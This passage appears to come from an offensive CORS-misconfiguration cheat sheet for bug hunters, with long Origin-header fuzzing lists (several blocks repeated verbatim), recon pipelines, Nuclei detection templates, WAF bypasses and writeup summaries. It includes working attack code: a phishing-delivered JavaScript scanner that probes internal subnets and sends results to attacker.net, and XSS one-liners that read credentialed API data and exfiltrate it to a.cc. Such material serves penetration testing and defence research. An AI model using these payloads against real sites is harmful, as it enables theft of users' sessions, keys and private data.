Origin: https://victim_com.evil.com
Origin: https://victim.com%2e.evil.com
```

---

## Fuzzing Payloads

### Origin Header Fuzzing List

```
https://evil.com
http://evil.com
//evil.com
https:evil.com
http:evil.com
https://evil.com/
https://evil.com?
https://evil.com#
https://evil.com%00
https://evil.com%0d%0a
https://evil.com%20
https://evil.com%09
https://evil.com%0b
https://evil.com..
https://evil.com...
https://.evil.com
https://..evil.com
https://evil.com.
https://evil.com..
https://evil.com/.evil.com
https://evil.com@evil.com
https://evil.com%40evil.com
https://evil.com;@evil.com
https://evil.com%2f%2f.evil.com
https://evil.com%2f.evil.com
https://evil.com%3f.evil.com
https://evil.com%23.evil.com
https://evil.com%5c.evil.com
https://evil.com%2e.evil.com
https://evil.com%252e.evil.com
https://evil.com%e3%80%82evil.com
https://evil.com%c0%afevil.com
https://evil.com%ef%bc%8eevil.com
https://evil.com%e3%80%80evil.com
https://evil.com%00.evil.com
https://evil.com%01.evil.com
https://evil.com%0a.evil.com
https://evil.com%0d.evil.com
https://evil.com%0d%0a.evil.com
https://evil.com%0a%0d.evil.com
https://evil.com%7f.evil.com
https://evil.com%c0%80.evil.com
https://evil.com%c1%9c.evil.com
https://evil.com%c1%9c.evil.com
https://evil.com%c0%af.evil.com
https://evil.com%c0%9c.evil.com
https://evil.com%c0%8c.evil.com
https://evil.com%c0%bc.evil.com
https://evil.com%c1%9c.evil.com
https://evil.com%c1%9c.evil.com
https://evil.com%c0%80.evil.com
https://evil.com%c0%81.evil.com
https://evil.com%c0%82.evil.com
https://evil.com%c0%83.evil.com
https://evil.com%c0%84.evil.com
https://evil.com%c0%85.evil.com
https://evil.com%c0%86.evil.com
https://evil.com%c0%87.evil.com
https://evil.com%c0%88.evil.com
https://evil.com%c0%89.evil.com
https://evil.com%c0%8a.evil.com
https://evil.com%c0%8b.evil.com
https://evil.com%c0%8c.evil.com
https://evil.com%c0%8d.evil.com
https://evil.com%c0%8e.evil.com
https://evil.com%c0%8f.evil.com
https://evil.com%c0%90.evil.com
https://evil.com%c0%91.evil.com
https://evil.com%c0%92.evil.com
https://evil.com%c0%93.evil.com
https://evil.com%c0%94.evil.com
https://evil.com%c0%95.evil.com
https://evil.com%c0%96.evil.com
https://evil.com%c0%97.evil.com
https://evil.com%c0%98.evil.com
https://evil.com%c0%99.evil.com
https://evil.com%c0%9a.evil.com
https://evil.com%c0%9b.evil.com
https://evil.com%c0%9c.evil.com
https://evil.com%c0%9d.evil.com
https://evil.com%c0%9e.evil.com
https://evil.com%c0%9f.evil.com
https://evil.com%c0%a0.evil.com
https://evil.com%c0%a1.evil.com
https://evil.com%c0%a2.evil.com
https://evil.com%c0%a3.evil.com
https://evil.com%c0%a4.evil.com
https://evil.com%c0%a5.evil.com
https://evil.com%c0%a6.evil.com
https://evil.com%c0%a7.evil.com
https://evil.com%c0%a8.evil.com
https://evil.com%c0%a9.evil.com
https://evil.com%c0%aa.evil.com
https://evil.com%c0%ab.evil.com
https://evil.com%c0%ac.evil.com
https://evil.com%c0%ad.evil.com
https://evil.com%c0%ae.evil.com
https://evil.com%c0%af.evil.com
https://evil.com%c0%b0.evil.com
https://evil.com%c0%b1.evil.com
https://evil.com%c0%b2.evil.com
https://evil.com%c0%b3.evil.com
https://evil.com%c0%b4.evil.com
https://evil.com%c0%b5.evil.com
https://evil.com%c0%b6.evil.com
https://evil.com%c0%b7.evil.com
https://evil.com%c0%b8.evil.com
https://evil.com%c0%b9.evil.com
https://evil.com%c0%ba.evil.com
https://evil.com%c0%bb.evil.com
https://evil.com%c0%bc.evil.com
https://evil.com%c0%bd.evil.com
https://evil.com%c0%be.evil.com
https://evil.com%c0%bf.evil.com
https://evil.com%00.evil.com
https://evil.com%01.evil.com
https://evil.com%02.evil.com
https://evil.com%03.evil.com
https://evil.com%04.evil.com
https://evil.com%05.evil.com
https://evil.com%06.evil.com
https://evil.com%07.evil.com
https://evil.com%08.evil.com
https://evil.com%09.evil.com
https://evil.com%0a.evil.com
https://evil.com%0b.evil.com
https://evil.com%0c.evil.com
https://evil.com%0d.evil.com
https://evil.com%0e.evil.com
https://evil.com%0f.evil.com
https://evil.com%10.evil.com
https://evil.com%11.evil.com
https://evil.com%12.evil.com
https://evil.com%13.evil.com
https://evil.com%14.evil.com
https://evil.com%15.evil.com
https://evil.com%16.evil.com
https://evil.com%17.evil.com
https://evil.com%18.evil.com
https://evil.com%19.evil.com
https://evil.com%1a.evil.com
https://evil.com%1b.evil.com
https://evil.com%1c.evil.com
https://evil.com%1d.evil.com
https://evil.com%1e.evil.com
https://evil.com%1f.evil.com
https://evil.com%7f.evil.com
https://evil.com%c0%80.evil.com
https://evil.com%c0%81.evil.com
https://evil.com%c0%82.evil.com
https://evil.com%c0%83.evil.com
https://evil.com%c0%84.evil.com
https://evil.com%c0%85.evil.com
https://evil.com%c0%86.evil.com
https://evil.com%c0%87.evil.com
https://evil.com%c0%88.evil.com
https://evil.com%c0%89.evil.com
https://evil.com%c0%8a.evil.com
https://evil.com%c0%8b.evil.com
https://evil.com%c0%8c.evil.com
https://evil.com%c0%8d.evil.com
https://evil.com%c0%8e.evil.com
https://evil.com%c0%8f.evil.com
https://evil.com%c0%90.evil.com
https://evil.com%c0%91.evil.com
https://evil.com%c0%92.evil.com
https://evil.com%c0%93.evil.com
https://evil.com%c0%94.evil.com
https://evil.com%c0%95.evil.com
https://evil.com%c0%96.evil.com
https://evil.com%c0%97.evil.com
https://evil.com%c0%98.evil.com
https://evil.com%c0%99.evil.com
https://evil.com%c0%9a.evil.com
https://evil.com%c0%9b.evil.com
https://evil.com%c0%9c.evil.com
https://evil.com%c0%9d.evil.com
https://evil.com%c0%9e.evil.com
https://evil.com%c0%9f.evil.com
https://evil.com%c0%a0.evil.com
https://evil.com%c0%a1.evil.com
https://evil.com%c0%a2.evil.com
https://evil.com%c0%a3.evil.com
https://evil.com%c0%a4.evil.com
https://evil.com%c0%a5.evil.com
https://evil.com%c0%a6.evil.com
https://evil.com%c0%a7.evil.com
https://evil.com%c0%a8.evil.com
https://evil.com%c0%a9.evil.com
https://evil.com%c0%aa.evil.com
https://evil.com%c0%ab.evil.com
https://evil.com%c0%ac.evil.com
https://evil.com%c0%ad.evil.com
https://evil.com%c0%ae.evil.com
https://evil.com%c0%af.evil.com
https://evil.com%c0%b0.evil.com
https://evil.com%c0%b1.evil.com
https://evil.com%c0%b2.evil.com
https://evil.com%c0%b3.evil.com
https://evil.com%c0%b4.evil.com
https://evil.com%c0%b5.evil.com
https://evil.com%c0%b6.evil.com
https://evil.com%c0%b7.evil.com
https://evil.com%c0%b8.evil.com
https://evil.com%c0%b9.evil.com
https://evil.com%c0%ba.evil.com
https://evil.com%c0%bb.evil.com
https://evil.com%c0%bc.evil.com
https://evil.com%c0%bd.evil.com
https://evil.com%c0%be.evil.com
https://evil.com%c0%bf.evil.com
https://evil.com%00.evil.com
https://evil.com%01.evil.com
https://evil.com%02.evil.com
https://evil.com%03.evil.com
https://evil.com%04.evil.com
https://evil.com%05.evil.com
https://evil.com%06.evil.com
https://evil.com%07.evil.com
https://evil.com%08.evil.com
https://evil.com%09.evil.com
https://evil.com%0a.evil.com
https://evil.com%0b.evil.com
https://evil.com%0c.evil.com
https://evil.com%0d.evil.com
https://evil.com%0e.evil.com
https://evil.com%0f.evil.com
https://evil.com%10.evil.com
https://evil.com%11.evil.com
https://evil.com%12.evil.com
https://evil.com%13.evil.com
https://evil.com%14.evil.com
https://evil.com%15.evil.com
https://evil.com%16.evil.com
https://evil.com%17.evil.com
https://evil.com%18.evil.com
https://evil.com%19.evil.com
https://evil.com%1a.evil.com
https://evil.com%1b.evil.com
https://evil.com%1c.evil.com
https://evil.com%1d.evil.com
https://evil.com%1e.evil.com
https://evil.com%1f.evil.com
https://evil.com%7f.evil.com
https://evil.com%c0%80.evil.com
https://evil.com%c0%81.evil.com
https://evil.com%c0%82.evil.com
https://evil.com%c0%83.evil.com
https://evil.com%c0%84.evil.com
https://evil.com%c0%85.evil.com
https://evil.com%c0%86.evil.com
https://evil.com%c0%87.evil.com
https://evil.com%c0%88.evil.com
https://evil.com%c0%89.evil.com
https://evil.com%c0%8a.evil.com
https://evil.com%c0%8b.evil.com
https://evil.com%c0%8c.evil.com
https://evil.com%c0%8d.evil.com
https://evil.com%c0%8e.evil.com
https://evil.com%c0%8f.evil.com
https://evil.com%c0%90.evil.com
https://evil.com%c0%91.evil.com
https://evil.com%c0%92.evil.com
https://evil.com%c0%93.evil.com
https://evil.com%c0%94.evil.com
https://evil.com%c0%95.evil.com
https://evil.com%c0%96.evil.com
https://evil.com%c0%97.evil.com
https://evil.com%c0%98.evil.com
https://evil.com%c0%99.evil.com
https://evil.com%c0%9a.evil.com
https://evil.com%c0%9b.evil.com
https://evil.com%c0%9c.evil.com
https://evil.com%c0%9d.evil.com
https://evil.com%c0%9e.evil.com
https://evil.com%c0%9f.evil.com
https://evil.com%c0%a0.evil.com
https://evil.com%c0%a1.evil.com
https://evil.com%c0%a2.evil.com
https://evil.com%c0%a3.evil.com
https://evil.com%c0%a4.evil.com
https://evil.com%c0%a5.evil.com
https://evil.com%c0%a6.evil.com
https://evil.com%c0%a7.evil.com
https://evil.com%c0%a8.evil.com
https://evil.com%c0%a9.evil.com
https://evil.com%c0%aa.evil.com
https://evil.com%c0%ab.evil.com
https://evil.com%c0%ac.evil.com
https://evil.com%c0%ad.evil.com
https://evil.com%c0%ae.evil.com
https://evil.com%c0%af.evil.com
https://evil.com%c0%b0.evil.com
https://evil.com%c0%b1.evil.com
https://evil.com%c0%b2.evil.com
https://evil.com%c0%b3.evil.com
https://evil.com%c0%b4.evil.com
https://evil.com%c0%b5.evil.com
https://evil.com%c0%b6.evil.com
https://evil.com%c0%b7.evil.com
https://evil.com%c0%b8.evil.com
https://evil.com%c0%b9.evil.com
https://evil.com%c0%ba.evil.com
https://evil.com%c0%bb.evil.com
https://evil.com%c0%bc.evil.com
https://evil.com%c0%bd.evil.com
https://evil.com%c0%be.evil.com
https://evil.com%c0%bf.evil.com
https://evil.com%00.evil.com
https://evil.com%01.evil.com
https://evil.com%02.evil.com
https://evil.com%03.evil.com
https://evil.com%04.evil.com
https://evil.com%05.evil.com
https://evil.com%06.evil.com
https://evil.com%07.evil.com
https://evil.com%08.evil.com
https://evil.com%09.evil.com
https://evil.com%0a.evil.com
https://evil.com%0b.evil.com
https://evil.com%0c.evil.com
https://evil.com%0d.evil.com
https://evil.com%0e.evil.com
https://evil.com%0f.evil.com
https://evil.com%10.evil.com
https://evil.com%11.evil.com
https://evil.com%12.evil.com
https://evil.com%13.evil.com
https://evil.com%14.evil.com
https://evil.com%15.evil.com
https://evil.com%16.evil.com
https://evil.com%17.evil.com
https://evil.com%18.evil.com
https://evil.com%19.evil.com
https://evil.com%1a.evil.com
https://evil.com%1b.evil.com
https://evil.com%1c.evil.com
https://evil.com%1d.evil.com
https://evil.com%1e.evil.com
https://evil.com%1f.evil.com
https://evil.com%7f.evil.com
https://evil.com%c0%80.evil.com
https://evil.com%c0%81.evil.com
https://evil.com%c0%82.evil.com
https://evil.com%c0%83.evil.com
https://evil.com%c0%84.evil.com
https://evil.com%c0%85.evil.com
https://evil.com%c0%86.evil.com
https://evil.com%c0%87.evil.com
https://evil.com%c0%88.evil.com
https://evil.com%c0%89.evil.com
https://evil.com%c0%8a.evil.com
https://evil.com%c0%8b.evil.com
https://evil.com%c0%8c.evil.com
https://evil.com%c0%8d.evil.com
https://evil.com%c0%8e.evil.com
https://evil.com%c0%8f.evil.com
https://evil.com%c0%90.evil.com
https://evil.com%c0%91.evil.com
https://evil.com%c0%92.evil.com
https://evil.com%c0%93.evil.com
https://evil.com%c0%94.evil.com
https://evil.com%c0%95.evil.com
https://evil.com%c0%96.evil.com
https://evil.com%c0%97.evil.com
https://evil.com%c0%98.evil.com
https://evil.com%c0%99.evil.com
https://evil.com%c0%9a.evil.com
https://evil.com%c0%9b.evil.com
https://evil.com%c0%9c.evil.com
https://evil.com%c0%9d.evil.com
https://evil.com%c0%9e.evil.com
https://evil.com%c0%9f.evil.com
https://evil.com%c0%a0.evil.com
https://evil.com%c0%a1.evil.com
https://evil.com%c0%a2.evil.com
https://evil.com%c0%a3.evil.com
https://evil.com%c0%a4.evil.com
https://evil.com%c0%a5.evil.com
https://evil.com%c0%a6.evil.com
https://evil.com%c0%a7.evil.com
https://evil.com%c0%a8.evil.com
https://evil.com%c0%a9.evil.com
https://evil.com%c0%aa.evil.com
https://evil.com%c0%ab.evil.com
https://evil.com%c0%ac.evil.com
https://evil.com%c0%ad.evil.com
https://evil.com%c0%ae.evil.com
https://evil.com%c0%af.evil.com
https://evil.com%c0%b0.evil.com
https://evil.com%c0%b1.evil.com
https://evil.com%c0%b2.evil.com
https://evil.com%c0%b3.evil.com
https://evil.com%c0%b4.evil.com
https://evil.com%c0%b5.evil.com
https://evil.com%c0%b6.evil.com
https://evil.com%c0%b7.evil.com
https://evil.com%c0%b8.evil.com
https://evil.com%c0%b9.evil.com
https://evil.com%c0%ba.evil.com
https://evil.com%c0%bb.evil.com
https://evil.com%c0%bc.evil.com
https://evil.com%c0%bd.evil.com
https://evil.com%c0%be.evil.com
https://evil.com%c0%bf.evil.com
```

### Protocol Fuzzing

```
https://victim.com
http://victim.com
ftp://victim.com
file://victim.com
javascript://victim.com
data://victim.com
vbscript://victim.com
```

### Subdomain Variations

```
https://evil.victim.com
https://victim.com.evil.com
https://evil-victim.com
https://victim-evil.com
https://notvictim.com
https://victim.com.attacker.com
https://attacker.victim.com.evil.com
https://www.victim.com.evil.com
https://victim.com:80.evil.com
https://victim.com.evil.com:443
```

---

## Automation Workflows

### Workflow 1: Mass CORS Scanning with Corsy

```bash
# Install Corsy
git clone https://github.com/s0md3v/Corsy.git
cd Corsy
pip3 install requests

# Single target
python3 corsy.py -u https://victim.com

# Multiple targets from file
python3 corsy.py -i targets.txt -t 20 -o results.json

# From stdin (pipeline)
cat targets.txt | python3 corsy.py -o results.json

# With custom headers
python3 corsy.py -u https://victim.com   --headers "User-Agent: Mozilla/5.0\nCookie: SESSION=test"
```

**Corsy Tests Implemented:**
- Pre-domain bypass
- Post-domain bypass
- Backtick bypass (Safari)
- Null origin bypass
- Unescaped dot bypass
- Underscore bypass
- Invalid value
- Wildcard value
- Origin reflection test
- Third-party allowance test
- HTTP allowance test

### Workflow 2: ProjectDiscovery Pipeline for CORS Hunting

```bash
# Step 1: Subdomain enumeration
subfinder -d victim.com -all -o subs.txt

# Step 2: Probe live hosts + extract headers
httpx -l subs.txt -headers -o headers.txt

# Step 3: Filter for CORS headers
grep -i "access-control-allow" headers.txt

# Step 4: Deep crawl for API endpoints
katana -u https://victim.com -d 3 -o endpoints.txt

# Step 5: Nuclei CORS scan
nuclei -l endpoints.txt -t http/misconfiguration/cors/ -o nuclei-cors.txt

# Step 6: Interactsh for blind/exfil testing
# (Use interactsh to verify if CORS exfiltration reaches external server)
```

### Workflow 3: Burp Suite + BChecks Custom Scan

```yaml
# BCheck: CORS Origin Reflection Detector
metadata:
  language: v2-beta
  name: "CORS Origin Reflection"
  description: "Detects arbitrary origin reflection with credentials"
  author: "Custom"
  tags: "active", "cors", "custom"

given request then
    send request:
        replacing headers:
            "Origin": "https://evil-cors-test.com"

    if {latest.response.headers} matches "Access-Control-Allow-Origin: https://evil-cors-test.com" then
        if {latest.response.headers} matches "Access-Control-Allow-Credentials: true" then
            report issue:
                severity: high
                confidence: certain
                detail: "Arbitrary origin reflection with credentials enabled."
                remediation: "Validate the Origin header against an explicit whitelist."
        end if
    end if
```

### Workflow 4: Blind CORS Misconfiguration Detection

```bash
# Using blind-cors-misconfigurations
# This tool detects CORS misconfigurations that don't immediately reflect

# Step 1: Collect URLs
cat urls.txt | python3 blind_cors.py --callback https://attacker.net/callback

# Step 2: The tool sends requests with unique origins and checks if callbacks fire
# indicating the origin was trusted and a preflight/actual request was made
```

### Workflow 5: Internal Network CORS Pivoting

```bash
# Step 1: Identify employees (social engineering, LinkedIn)
# Step 2: Send phishing link to evil.com
# Step 3: Evil.com runs internal scanner:

# JavaScript payload hosted on evil.com
for (let subnet of ['192.168.1', '10.0.0', '172.16.0']) {
    for (let i = 1; i <= 254; i++) {
        let url = `http://${subnet}.${i}:8080/api/info`;
        fetch(url, {mode: 'cors'})
            .then(r => r.text())
            .then(t => fetch(`https://attacker.net/log?ip=${subnet}.${i}&data=`+btoa(t)));
    }
}
```

---

## Recon Methodology

### Phase 1: Asset Discovery

```bash
# 1. Subdomain enumeration
subfinder -d victim.com -all | anew subs.txt
amass enum -d victim.com -o amass.txt
assetfinder --subs-only victim.com | anew subs.txt

# 2. Permutation/alteration
alterx -l subs.txt -o permuted.txt

# 3. DNS resolution
cat subs.txt | dnsx -o resolved.txt

# 4. CDN/Cloud detection
cat resolved.txt | cdncheck -o cdn.txt
```

### Phase 2: Endpoint Discovery

```bash
# 1. Crawl for API endpoints
katana -u https://victim.com -d 5 -o endpoints.txt
waybackurls victim.com | anew endpoints.txt
gau victim.com | anew endpoints.txt

# 2. API-specific paths to check
cat endpoints.txt | grep -E "(/api/|/v1/|/v2/|/graphql|/rest/|/swagger|/openapi)" | anew api-endpoints.txt

# 3. Technology fingerprinting
httpx -l resolved.txt -tech-detect -o tech.txt
```

### Phase 3: CORS-Specific Recon

```bash
# 1. Header extraction
httpx -l resolved.txt -headers -o headers.txt

# 2. Filter for CORS presence
grep -i "access-control-allow" headers.txt

# 3. Check for API endpoints that might have CORS
cat api-endpoints.txt | xargs -I {} curl -s -I -H "Origin: https://evil.com" {} | grep -i "access-control"

# 4. Check for internal/dev/staging subdomains
cat subs.txt | grep -E "(dev|staging|test|internal|admin|api|cdn|assets)" | anew interesting-subs.txt
```

### Phase 4: Manual Verification

For each endpoint with CORS headers:

1. **Test arbitrary reflection:**
   ```bash
   curl -H "Origin: https://evil.com" -I https://api.victim.com/user
   ```

2. **Test null origin:**
   ```bash
   curl -H "Origin: null" -I https://api.victim.com/user
   ```

3. **Test subdomain trust:**
   ```bash
   curl -H "Origin: https://evil.victim.com" -I https://api.victim.com/user
   curl -H "Origin: https://victim.com.evil.com" -I https://api.victim.com/user
   ```

4. **Test protocol downgrade:**
   ```bash
   curl -H "Origin: http://victim.com" -I https://api.victim.com/user
   ```

5. **Test preflight vs actual:**
   ```bash
   curl -X OPTIONS -H "Origin: https://evil.com"         -H "Access-Control-Request-Method: PUT"         -I https://api.victim.com/user
   ```

### Phase 5: Impact Assessment

- Does the endpoint return sensitive data? (PII, tokens, keys)
- Is `Access-Control-Allow-Credentials: true` present?
- Can the origin be controlled by the attacker? (register domain, subdomain takeover, XSS)
- Is the target on an internal network?
- Are there cache implications (missing `Vary: Origin`)?

---

## Nuclei Templates

### Template 1: CORS Arbitrary Origin Reflection

```yaml
id: cors-arbitrary-origin

info:
  name: CORS Arbitrary Origin Reflection
  author: pd-team
  severity: high
  description: |
    The application reflects arbitrary origins in the Access-Control-Allow-Origin header
    and allows credentials, enabling cross-origin data theft.
  tags: cors,misconfig

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: https://evil.com

    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
          - "Access-Control-Allow-Credentials: true"
        condition: and
        part: header

      - type: word
        words:
          - "Access-Control-Allow-Origin: *"
        negative: true
        part: header
```

### Template 2: CORS Null Origin Whitelisted

```yaml
id: cors-null-origin

info:
  name: CORS Null Origin Whitelisted
  author: custom
  severity: medium
  description: |
    The application whitelists the null origin, which can be exploited via
    sandboxed iframes or data URIs.
  tags: cors,misconfig

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: null

    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: null"
        part: header
```

### Template 3: CORS Wildcard with Credentials (Invalid but Detectable)

```yaml
id: cors-wildcard-credentials

info:
  name: CORS Wildcard with Credentials Header
  author: custom
  severity: low
  description: |
    Server sends wildcard ACAO with ACAC header. Browsers block this,
    but indicates misconfigured intent.
  tags: cors,misconfig

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: https://evil.com

    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: *"
          - "Access-Control-Allow-Credentials: true"
        condition: and
        part: header
```

### Template 4: CORS Trusted Subdomain — Potential XSS Pivot

```yaml
id: cors-trusted-subdomain

info:
  name: CORS Trusted Subdomain Configuration
  author: custom
  severity: info
  description: |
    The application trusts subdomain origins. If any subdomain has XSS,
    it can be used to steal data from the main domain.
  tags: cors,info

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: https://evil.{{Hostname}}

    matchers:
      - type: regex
        regex:
          - "Access-Control-Allow-Origin: https://evil\.[^\s]+"
        part: header
```

### Template 5: CORS HTTP Origin on HTTPS Site

```yaml
id: cors-http-origin-https-site

info:
  name: CORS HTTP Origin Trusted on HTTPS Site
  author: custom
  severity: medium
  description: |
    An HTTPS site trusts HTTP origins, enabling MITM attacks to bypass TLS.
  tags: cors,misconfig

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: http://{{Hostname}}

    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: http://"
        part: header
```

### Template 6: CORS Missing Vary Origin (Cache Poisoning Risk)

```yaml
id: cors-missing-vary-origin

info:
  name: CORS Missing Vary Origin Header
  author: custom
  severity: low
  description: |
    Dynamic ACAO without Vary: Origin enables cache poisoning attacks.
  tags: cors,cache

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: https://evil.com

    matchers:
      - type: word
        words:
          - "Access-Control-Allow-Origin: https://evil.com"
        part: header

      - type: word
        words:
          - "Vary: Origin"
          - "Vary: "Origin""
        negative: true
        part: header
```

---

## Tools and Scanners

### Corsy (s0md3v)

- **Language:** Python 3
- **Tests:** Pre-domain bypass, post-domain bypass, backtick bypass, null origin, unescaped dot, underscore bypass, invalid value, wildcard, origin reflection, third-party allowance, HTTP allowance
- **Usage:**
  ```bash
  python3 corsy.py -u https://target.com
  python3 corsy.py -i urls.txt -t 20 -o output.json
  ```

### CORScanner (chenjj / doyensec)

- **Language:** Python
- **Features:** Fast scanning, multiple bypass payloads, concurrent testing
- **Usage:**
  ```bash
  python3 cors_scan.py -u https://target.com
  python3 cors_scan.py -i urls.txt
  ```

### CorsOne (omranisecurity)

- Fast CORS misconfiguration discovery
- Supports custom headers and threading

### of-cors (trufflesecurity)

- Exploit CORS misconfigurations on internal networks
- DNS rebinding integration

### Blind CORS Misconfigurations (assetnote)

- Detects blind CORS issues where reflection isn't immediate
- Callback-based detection

### CORStest (0x240x23elu / RUB-NDS)

- Command-line CORS misconfiguration testing
- Multiple origin payloads

### CORS-Scanner (shivsahni)

- Automated CORS vulnerability scanner
- Report generation

### Burp Suite Extensions

- **CORS* (PortSwigger BApp Store):** Active/passive CORS scanning
- **Autorize:** Test authorization + CORS interactions
- **Burp Collaborator:** Detect blind CORS exfiltration

### Nuclei Templates

```bash
# Run all CORS templates
nuclei -u https://target.com -t http/misconfiguration/cors/

# Specific templates
nuclei -u https://target.com -t cors-misconfiguration.yaml
nuclei -u https://target.com -t cors-origin-reflection.yaml
```

---

## Advanced Research

### James Kettle's Research (PortSwigger, 2016)

Key findings:
1. **Dynamic header generation is the root cause:** Browsers don't support multiple origins or subdomain wildcards, forcing developers to implement dangerous dynamic reflection.
2. **Null origin is more dangerous than wildcard:** The spec and browsers should treat null origin with the same restriction as wildcard + credentials.
3. **Parser confusion via backticks:** Safari's lenient URL parser enables hostname extraction attacks.
4. **CRLF + Cache Poisoning:** Missing `Vary: Origin` + CRLF in reflected Origin enables stored XSS via cache poisoning.
5. **HTTP origin on HTTPS sites:** Active MITM can exploit CORS to bypass TLS entirely.

### Advanced CORS Exploitation Techniques (Corben Leo)

- Underscore bypass for Firefox/Chrome
- Advanced regex bypasses
- Combining CORS with other vulnerabilities (XXE, SSRF, cache deception)

### Think Outside the Scope (Ayoub Safa / Sandh0t)

- Expanding origins via URL encoding
- Double-encoded origin bypasses
- Unicode normalization attacks
- Case-sensitivity bypasses (`Evil.Com` vs `evil.com`)

### Client-Side Prototype Pollution + CORS

If a site has client-side prototype pollution:
1. Pollute `XMLHttpRequest.prototype.withCredentials` to `true`
2. All subsequent CORS requests send cookies automatically
3. Even if the attacker page normally wouldn't get credentialed access, the polluted prototype forces it

---

## Bug Bounty Writeups

### Writeup 1: CORS Misconfiguration → Account Takeover

**Author:** Rohan (nahoragg)  
**Platform:** HackerOne/Bugcrowd  
**Finding:** CORS misconfiguration allowed reading user profile data including email verification status and partial password hashes. Combined with weak password reset flow to achieve account takeover.

### Writeup 2: CORS on API Domain → Private Information Disclosure

**Author:** sandh0t  
**Finding:** API subdomain reflected arbitrary origins with ACAC. API returned full user profiles including phone numbers, addresses, and order history.

### Writeup 3: CORS + XSS on Trusted Origin → Admin Panel Access

**Author:** bughunterboy  
**Finding:** Main site trusted `*.victim.com`. Found stored XSS on `blog.victim.com`. Used XSS to make CORS requests to `admin.victim.com/api/users` and exfiltrate admin session data.

### Writeup 4: CORS on Zomato

**Author:** James Kettle (albinowax)  
**Date:** 2016  
**Finding:** CORS misconfiguration on `www.zomato.com` leading to information disclosure.

### Writeup 5: CORS Misconfiguration for Bitcoins and Bounties

**Author:** James Kettle  
**Date:** 2016  
**Impact:** Multiple cryptocurrency exchanges vulnerable. One allowed API key theft leading to bitcoin transfer. Another allowed wallet backup theft via null origin.

---

## Payload Collections

### Swissky's PayloadsAllTheThings — CORS Section

Core payloads extracted and deduplicated above in:
- [Origin Reflection Payloads](#origin-reflection-payloads)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Null Origin Exploitation](#null-origin-exploitation)

### PayloadBox CORS Payload List

Additional origin variations:
```
https://attacker.com
https://attacker.com:443
https://attacker.com:80
http://attacker.com
http://attacker.com:443
http://attacker.com:80
//attacker.com
\attacker.com
https://attacker.com%00
https://attacker.com%0d%0a
https://attacker.com?
https://attacker.com#
https://attacker.com/
https://attacker.com/../
https://attacker.com/./
https://attacker.com%2f%2f
https://attacker.com%2f
https://attacker.com%5c%5c
https://attacker.com%5c
https://attacker.com%40
https://attacker.com%23
https://attacker.com%3f
```

### Tiny XSS Payloads (terjanq) — CORS Context

When injecting CORS payloads via XSS on trusted origins, use minimal payloads:

```javascript
// Minimal CORS theft payload
fetch('/api/keys',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('//a.cc/'+btoa(t)))
```

```javascript
// One-liner for XSS injection
var x=new XMLHttpRequest();x.open('GET','/api/user',true);x.withCredentials=true;x.onload=function(){fetch('https://a.cc/?d='+btoa(this.responseText))};x.send();
```

---

## WAF Bypasses

### Origin Header WAF Bypasses

Some WAFs check the Origin header for malicious values. Bypass techniques:

#### Case Variation

```http
Origin: https://EVIL.COM
Origin: https://Evil.Com
Origin: https://eViL.cOm
```

#### Protocol Mismatch

```http
Origin: http://evil.com  # Sent to HTTPS site, WAF may not check protocol
```

#### Double Origin Header

```http
Origin: https://victim.com
Origin: https://evil.com
```

Some servers/WAFs check the first Origin, but the server reflects the second.

#### Origin with Path/Query

```http
Origin: https://evil.com/path
Origin: https://evil.com?query=1
```

Some parsers strip path/query for validation but reflect the full header.

#### Encoded Origin

```http
Origin: https://%65%76%69%6c.com  # URL-encoded "evil"
```

### Request Smuggling + CORS

If the site is vulnerable to HTTP Request Smuggling:
1. Smuggle a request with a malicious Origin header
2. The smuggled request poisons the connection
3. Subsequent requests on the same connection get the poisoned CORS response

---

## Detection Techniques

### Passive Detection

1. **Proxy all traffic** through Burp/ZAP and filter for `Access-Control-Allow-Origin`
2. **Look for dynamic generation indicators:** ACAO present only when Origin request header is sent
3. **Check for missing `Vary: Origin`** on responses with ACAO
4. **Identify ACAC: true** paired with non-static ACAO values

### Active Detection

1. **Send crafted Origin headers** and observe reflection
2. **Test null origin** via direct request
3. **Test preflight responses** vs actual request responses
4. **Test with/without cookies** to determine if credentials are required
5. **Fuzz origin variations** (subdomain, prefix, postfix, encoding)

### Blind Detection

1. **Use Collaborator/Interactsh:** Send Origin pointing to your server. If you receive a preflight OPTIONS request, the origin was processed.
2. **Time-based detection:** If the server performs database lookups for origin validation, timing differences may reveal valid vs invalid origins.
3. **Error message analysis:** Different error messages for "origin not allowed" vs "method not allowed" can reveal origin validation logic.

### Cache-Based Detection

1. Send request with Origin: evil.com → observe ACAO reflection
2. Send request without Origin header → if ACAO is still present, cache may be poisoned
3. Check `Age` header or `X-Cache` indicators

---

## References

### Primary Sources

1. **PortSwigger Research:** "Exploiting CORS misconfigurations for Bitcoins and bounties" — James Kettle (2016)
2. **PortSwigger Web Security Academy:** CORS vulnerability labs and tutorials
3. **PayloadsAllTheThings:** CORS Misconfiguration README — swisskyrepo
4. **HackTricks:** CORS Misconfigurations & Bypass
5. **OWASP CORS Cheat Sheet**
6. **OWASP CORS Request Preflight Scrutiny**
7. **MDN Web Docs:** CORS, Access-Control-Allow-Origin, Access-Control-Allow-Credentials

### Tools & Repositories

- s0md3v/Corsy
- chenjj/CORScanner
- doyensec/CORScanner
- omranisecurity/CorsOne
- trufflesecurity/of-cors
- assetnote/blind-cors-misconfigurations
- 0x240x23elu/CORStest
- RUB-NDS/CORStest
- shivsahni/CORS-Scanner
- projectdiscovery/nuclei-templates (http/misconfiguration/cors)
- payloadbox/cors-payload-list
- GeekyCat/vulnerable-cors
- PortSwigger/cors (Burp extension)

### Bug Bounty Writeups

- James Kettle — CORS Misconfiguration on www.zomato.com
- Rohan (nahoragg) — CORS misconfig | Account Takeover
- sandh0t — CORS Misconfiguration leading to Private Information Disclosure
